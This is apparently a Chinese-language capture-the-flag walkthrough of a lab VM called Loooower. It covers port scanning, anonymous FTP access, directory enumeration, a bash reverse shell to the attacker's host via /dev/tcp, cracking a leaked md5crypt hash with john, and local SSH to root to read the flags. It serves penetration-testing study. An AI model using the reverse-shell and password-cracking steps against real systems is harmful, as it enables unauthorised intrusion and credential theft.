# 信息搜集

端口扫描

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.5
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 11:44 -0400
Nmap scan report for 192.168.21.5
Host is up (0.00073s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.21.6
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 102400
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 106      113          4096 May 15  2025 confidential
|_drwxr-xr-x    2 106      113          4096 May 15  2025 uploads
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:2E:3B:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 192.168.21.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
```

# 漏洞利用

21ftp存在匿名登录

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.21.5
Connected to 192.168.21.5.
220 (vsFTPd 3.0.3)
Name (192.168.21.5:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30105|)
150 Here comes the directory listing.
drwxr-xr-x    2 106      113          4096 May 15  2025 confidential
drwxr-xr-x    2 106      113          4096 May 15  2025 uploads
226 Directory send OK.
ftp> cd confidential
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35350|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             202 May 15  2025 hosts
-rw-r--r--    1 106      113          1494 May 15  2025 passwd
226 Directory send OK.
ftp> mget *
mget hosts [anpqy?]? 
229 Entering Extended Passive Mode (|||22944|)
150 Opening BINARY mode data connection for hosts (202 bytes).
  0%      0        0.00 KiB/s  100%    202      612.62 KiB/s    00:00 ETA
226 Transfer complete.
202 bytes received in 00:00 (153.03 KiB/s)
mget passwd [anpqy?]? 
229 Entering Extended Passive Mode (|||45943|)
150 Opening BINARY mode data connection for passwd (1494 bytes).
  0%      0        0.00 KiB/s  100%   1494      777.29 KiB/s    00:00 ETA
226 Transfer complete.
1494 bytes received in 00:00 (631.59 KiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10084|)
150 Here comes the directory listing.
drwxr-xr-x    2 106      113          4096 May 15  2025 confidential
drwxr-xr-x    2 106      113          4096 May 15  2025 uploads
226 Directory send OK.
ftp> cd upload
550 Failed to change directory.
ftp> ls
229 Entering Extended Passive Mode (|||53986|)
150 Here comes the directory listing.
drwxr-xr-x    2 106      113          4096 May 15  2025 confidential
drwxr-xr-x    2 106      113          4096 May 15  2025 uploads
226 Directory send OK.
ftp> mget *
mget confidential [anpqy?]? 
229 Entering Extended Passive Mode (|||7636|)
550 Failed to open file.
mget uploads [anpqy?]? 
229 Entering Extended Passive Mode (|||41012|)
550 Failed to open file.
```

查看一下下载的文件

```bash
┌──(kali㉿kali)-[~]
└─$ cat hosts        
127.0.0.1       localhost
127.0.1.1       Loooower  dev.loooower

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
                               
┌──(kali㉿kali)-[~]
└─$ cat passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
ftp:x:106:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001::/home/ftpuser:/bin/bash
```

在hosts中添加一下dev.loooower

```shell
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/192.168.21.5/d' /etc/hosts && echo "192.168.21.5 dev.loooower" | sudo tee -a /etc/hosts
[sudo] password for kali: 
192.168.21.5 dev.loooower
```

查看一下网页

```shell
┌──(kali㉿kali)-[~]
└─$ curl dev.loooower
<!DOCTYPE html>
<html>
<head>
    <title>Nothing here</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            color: #333;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
        }
        .comment {
            color: #999;
            font-size: 0.8em;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <h1>Nothing here</h1>
    <p>This page is intentionally left blank.</p>
    
    <!-- Tm90aGluZyBoZXJlIGFnYWlu -->
</body>
</html>
```

解码一下看看

```shell
┌──(kali㉿kali)-[~]
└─$ echo 'Tm90aGluZyBoZXJlIGFnYWlu' | base64 -d
Nothing here again
```

目录枚举

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://dev.loooower -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.loooower
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              git,html,php,txt,jpg,png,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 644]
shell.php            (Status: 200) [Size: 15207]
server-status        (Status: 403) [Size: 277]
logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482016 / 9482016 (100.00%)
===============================================================
Finished
===============================================================
```

/shell.php页面是一个shell，尝试一下反弹shell

```shell
www-data@Loooower:…/www/dev.loooower# bash -c 'exec bash -i &>/dev/tcp/192.168.21.6/5555 <&1'
```

# 权限提升

```shell
//先提升一下交互
www-data@Loooower:/var/www$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Loooower:/var/www$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@Loooower:/var/www$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
//home下有两个用户
www-data@Loooower:/var/www$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 May 15  2025 .
drwxr-xr-x 18 root    root    4096 Mar 18  2025 ..
drwxr-xr-x  2 ftpuser ftpuser 4096 May 15  2025 ftpuser
drwxr-xr-x  3 welcome welcome 4096 May 15  2025 welcome
www-data@Loooower:/var/www$ cd /home/ftpuser
cd /home/ftpuser
www-data@Loooower:/home/ftpuser$ ls -la
ls -la
total 20
drwxr-xr-x 2 ftpuser ftpuser 4096 May 15  2025 .
drwxr-xr-x 4 root    root    4096 May 15  2025 ..
-rw-r--r-- 1 ftpuser ftpuser  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 ftpuser ftpuser 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 ftpuser ftpuser  807 Apr 18  2019 .profile
www-data@Loooower:/home/ftpuser$ cd ..
cd ..
www-data@Loooower:/home$ cd welcome
cd welcome
www-data@Loooower:/home/welcome$ ls -la
ls -la
total 32
drwxr-xr-x 3 welcome welcome 4096 May 15  2025 .
drwxr-xr-x 4 root    root    4096 May 15  2025 ..
lrwxrwxrwx 1 root    root       9 May 15  2025 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
drwx------ 2 welcome welcome 4096 May 15  2025 .ssh
-rw-r--r-- 1 root    root    1129 May 15  2025 backup.sh
-rw-r--r-- 1 root    root      44 May 15  2025 user.txt
//可以直接查看到user
www-data@Loooower:/home/welcome$ cat user.txt
cat user.txt
flag{user-ea03b17fbd2c5e4895ba0775348cc1a5}
//还有一个backup.sh
www-data@Loooower:/home/welcome$ cat backup.sh
cat backup.sh
#!/bin/bash
# Backup Script v1.0
# Usage: ./backup.sh [source_dir] [dest_dir]

# Check for required arguments
if [ $# -ne 2 ]; then
    echo "Usage: $0 <source_dir> <dest_dir>"
    exit 1
fi

# Verify source directory exists
if [ ! -d "$1" ]; then
    echo "Error: Source directory $1 not found"
    exit 1
fi

# Create destination directory if needed
mkdir -p "$2" || { echo "Error: Cannot create destination directory"; exit 1; }

# Generate timestamp
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BACKUP_NAME="backup_${TIMESTAMP}.tar.gz"

# Create backup
echo "Creating backup $BACKUP_NAME from $1..."
tar -czf "$2/$BACKUP_NAME" "$1" 2>/dev/null

# Verify backup was created
if [ $? -ne 0 ]; then
    echo "Error: Backup failed"
    exit 1
fi

# Calculate and display backup size
BACKUP_SIZE=$(du -h "$2/$BACKUP_NAME" | cut -f1)
echo "Backup completed successfully. Size: $BACKUP_SIZE"

# Cleanup old backups (keep last 5)
echo "Rotating backups..."
ls -t "$2"/backup_*.tar.gz | tail -n +6 | xargs rm -f
//暴露出来welcome用户的密码哈希
# The password for welcome is: $1$WP/Vj663$ZRtzxrX16pybyzam5Xmdi0
# Store this securely and don't commit to version control

exit 0
//破解一下
┌──(kali㉿kali)-[~]
└─$ echo '$1$WP/Vj663$ZRtzxrX16pybyzam5Xmdi0' > hash             
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash             
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis15         (?)     
1g 0:00:00:00 DONE (2026-10-06 14:02) 2.631g/s 131873p/s 131873c/s 131873C/s badbad..1master
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
www-data@Loooower:/home/welcome$ su welcome
su welcome
Password: alexis15

welcome@Loooower:~$ id  
id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
//然而并没有提权成功
welcome@Loooower:~$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for welcome: alexis15

Matching Defaults entries for welcome on Loooower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Loooower:
    (ALL) PASSWD: /usr/bin/figlet
//看了大佬写的，存在公钥和私钥，很可疑。原来可以通过ssh进行本地登录
welcome@Loooower:~/.ssh$ ssh root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux Loooower 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 15 08:42:54 2025 from 192.168.3.94
root@Loooower:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Loooower:~# cat root.txt
flag{root-cd519e63e450d863e5ee02814bae016d}
```